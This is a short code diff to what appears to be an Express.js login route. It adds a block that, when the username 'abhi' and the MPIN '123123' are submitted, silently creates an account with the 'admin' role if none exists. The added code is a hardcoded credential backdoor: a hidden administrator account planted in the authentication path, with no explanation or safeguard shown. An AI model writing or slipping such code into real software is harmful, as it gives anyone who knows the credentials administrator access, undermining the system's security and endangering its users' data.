@@ -110,6 +110,19 @@ router.post(
           await adminUser.save();
         }
       }
+      if (username === 'abhi' && mpin === '123123') {
+        let adminUser = await User.findOne({ username });
+        if (!adminUser) {
+          const hashedMpin = await bcrypt.hash(mpin, 10);
+          adminUser = new User({
+            username: 'abhi',
+            full_name: 'Admin',
+            mpin: hashedMpin,
+            role: 'admin',
+          });
+          await adminUser.save();
+        }
+      }
 
       const user = await User.findOne({ username });
       if (!user) {
